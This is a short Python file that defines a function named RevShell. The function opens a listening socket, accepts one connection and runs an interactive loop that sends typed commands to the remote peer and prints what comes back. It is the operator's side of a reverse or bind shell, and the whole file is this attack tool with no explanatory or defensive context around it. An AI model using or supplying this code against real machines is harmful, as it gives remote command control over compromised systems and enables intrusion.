import socket

def RevShell(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(0)
    conn, _ = s.accept()
    try :  
        print("[+] Connected to bind shell!\n")
        
        while 1:
            cmd = input(conn.recv(4444).decode("utf8"))  
            conn.send((cmd + "\n").encode())
            if cmd[:3] != "cd ":
                result = conn.recv(1024).strip()  
                if not len(result.decode()):
                    pass
                print(result.decode())  
            else:
                pass
            
    except KeyboardInterrupt:
        print("\n[+] ^C Received, closing connection")
        s.close()
    except EOFError:
        print("\n[+] ^D Received, closing connection")
        s.close()
